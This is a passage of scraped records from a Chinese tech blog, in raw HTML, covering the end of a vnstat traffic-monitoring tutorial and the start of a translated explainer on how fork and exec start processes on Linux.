style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ vnstat -i wlan1 --delete\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af36882806951666-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af36882806951666-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af36882806951666-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vnstat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wlan1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">delete</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af36882806951666-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>而下面这条命令将会为你的一个网络接口创建一个别名。这个例子使用了 Ubuntu 16.04 的一个有线接口名称：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af36886823239274\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ vnstat -u -i enp0s25 --nick eth0\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af36886823239274-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af36886823239274-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af36886823239274-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vnstat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">enp0s25</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">nick </span><span class=\"crayon-i\">eth0</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af36886823239274-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>默认情况下，vnstat 会监视 eth0。你可以在 <code>/etc/vnstat.conf</code> 对它进行修改，或者在你的家目录下创建你自己的个人配置文件。请参阅 <code>man vnstat</code> 以获取完整的指南。</p>\n<p>你也可以安装 <code>vnstati</code> 来创建简单的彩图（图 2）:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f37af3688b185913520\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ vnstati -s -i wlx7cdd90a0a1c2 -o vnstat.png\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f37af3688b185913520-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f37af3688b185913520-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f37af3688b185913520-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vnstati</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wlx7cdd90a0a1c2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">o</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vnstat</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">png</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f37af3688b185913520-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p><img title=\"vnstati\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/8fc64a29fff93e65cff2e523c0861ec7.png\" alt=\"vnstati\"></p>\n<p><em>图 2:你可以使用vnstati来创建简单的彩图。</em></p>\n<p>请参阅 <code>man vnstati</code> 以获取完整的选项。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113549\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113549votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113549\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/10/9aeba2223d66a3c6692233694383abce.jpg"], "title": "当你在 Linux 上启动一个进程时会发生什么？", "fav_nums": 3, "url": "http://blog.jobbole.com/113506/", "create_date": "2018/01/20", "url_object_id": "163e3c6dadc221edbe975926bad55ee5", "comment_nums": 2, "front_image_path": "full/a0c1bbf258eb5064ea3d6b896485a481525b7f95.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://jvns.ca/blog/2016/10/04/exec-will-eat-your-brain/\">Julia Evans</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9256-1.html\">Linux中国/jessie-pang</a>   </div><p>本文是关于 fork 和 exec 是如何在 Unix 上工作的。你或许已经知道，也有人还不知道。几年前当我了解到这些时，我惊叹不已。</p>\n<p>我们要做的是启动一个进程。我们已经在博客上讨论了很多关于<strong>系统调用</strong>的问题，每当你启动一个进程或者打开一个文件，这都是一个系统调用。所以你可能会认为有这样的系统调用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29451f1b4499787814\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstart_process([\"ls\", \"-l\", \"my_cool_directory\"])\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1b4499787814-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1b4499787814-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29451f1b4499787814-1\"><span class=\"crayon-e\">start_process</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">\"ls\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"-l\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"my_cool_directory\"</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1b4499787814-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这是一个合理的想法，显然这是它在 DOS 或 Windows 中的工作原理。我想说的是，这并不是 Linux 上的工作原理。但是，我查阅了文档，确实有一个 <a href=\"http://man7.org/linux/man-pages/man3/posix_spawn.3.html\">posix_spawn</a> 的系统调用基本上是这样做的，不过这不在本文的讨论范围内。</p>\n<h3 id=\"toc_1\">fork 和 exec</h3>\n<p>Linux 上的 <code>posix_spawn</code> 是通过两个系统调用实现的，分别是 <code>fork</code> 和 <code>exec</code>（实际上是 <code>execve</code>），这些都是人们常常使用的。尽管在 OS X 上，人们使用 <code>posix_spawn</code>，而 <code>fork</code> 和 <code>exec</code> 是不提倡的，但我们将讨论的是 Linux。</p>\n<p>Linux 中的每个进程都存在于“进程树”中。你可以通过运行 <code>pstree</code> 命令查看进程树。树的根是 <code>init</code>，进程号是 1。每个进程（<code>init</code> 除外）都有一个父进程，一个进程都可以有很多子进程。</p>\n<p>所以，假设我要启动一个名为 <code>ls</code> 的进程来列出一个目录。我是不是只要发起一个进程 <code>ls</code> 就好了呢？不是的。</p>\n<p>我要做的是，创建一个子进程，这个子进程是我（<code>me</code>）本身的一个克隆，然后这个子进程的“脑子”被吃掉了，变成 <code>ls</code>。</p>\n<p>开始是这样的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29451f1be150624227\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmy parent\r\n    |- me\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1be150624227-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1be150624227-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1be150624227-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29451f1be150624227-1\"><span class=\"crayon-e\">my </span><span class=\"crayon-r\">parent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1be150624227-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">me</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29451f1be150624227-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>然后运行 <code>fork()</code>，生成一个子进程，是我（<code>me</code>）自己的一份克隆：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29451f1c2957683708\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmy parent\r\n    |- me\r\n       |-- clone of me\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1c2957683708-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1c2957683708-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1c2957683708-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1c2957683708-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29451f1c2957683708-1\"><span class=\"crayon-e\">my </span><span class=\"crayon-r\">parent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1c2957683708-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">me</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29451f1c2957683708-3\"><span class=\"crayon-h\">       </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">clone</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">of </span><span class=\"crayon-i\">me</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1c2957683708-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>然后我让该子进程运行 <code>exec(\"ls\")</code>，变成这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29451f1c5424427301\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmy parent\r\n    |- me\r\n       |-- ls\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1c5424427301-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1c5424427301-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1c5424427301-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1c5424427301-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29451f1c5424427301-1\"><span class=\"crayon-e\">my </span><span class=\"crayon-r\">parent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1c5424427301-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">me</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29451f1c5424427301-3\"><span class=\"crayon-h\">       </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1c5424427301-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>当 ls 命令结束后，我几乎又变回了我自己：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29451f1c8325580810\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 